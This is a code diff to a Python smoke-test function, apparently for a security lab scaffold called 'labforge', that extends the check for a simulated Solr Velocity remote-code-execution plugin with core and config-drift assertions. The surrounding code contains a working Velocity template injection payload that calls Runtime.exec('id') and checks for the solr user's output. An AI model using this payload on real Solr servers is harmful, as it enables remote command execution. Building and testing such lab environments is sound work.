@@ -370,6 +370,8 @@ def run_single_plugin_smoke(service: str, plugin_id: str, client: Any) -> Plugin
                 correlation,
             )
         if plugin_id == "solr-velocity-rce":
+            cores = client.get("/labforge/scaffold/solr/cores")
+            drift_before = client.get("/labforge/scaffold/solr/config-drift")
             system = client.get("/labforge/scaffold/solr/admin/info/system")
             enabled = client.post(
                 "/labforge/scaffold/solr/config",
@@ -390,15 +392,25 @@ def run_single_plugin_smoke(service: str, plugin_id: str, client: Any) -> Plugin
                     "v.template.custom": '#set($x="")#set($p=$x.class.forName("java.lang.Runtime").getRuntime().exec("id"))',
                 },
             )
+            drift_after = client.get("/labforge/scaffold/solr/config-drift")
+            cores_data = cores.get_json(silent=True) or {}
+            drift_before_data = drift_before.get_json(silent=True) or {}
+            drift_after_data = drift_after.get_json(silent=True) or {}
             return assert_condition(
                 service,
                 plugin_id,
-                system.status_code == 200
+                cores.status_code == 200
+                and any(core.get("legacy") is True for core in cores_data.get("cores", []) if isinstance(core, dict))
+                and drift_before.status_code == 200
+                and drift_before_data.get("legacy_track") is True
+                and system.status_code == 200
                 and enabled.status_code == 200
                 and executed.status_code == 200
+                and drift_after.status_code == 200
+                and drift_after_data.get("velocity_response_writer") is True
                 and "uid=8983(solr)" in executed.get_data(as_text=True),
-                "/labforge/scaffold/solr/select",
-                executed,
+                "/labforge/scaffold/solr/cores + config-drift + select",
+                drift_after,
             )
         if plugin_id == "build-pipeline-abuse":
             response = client.post(
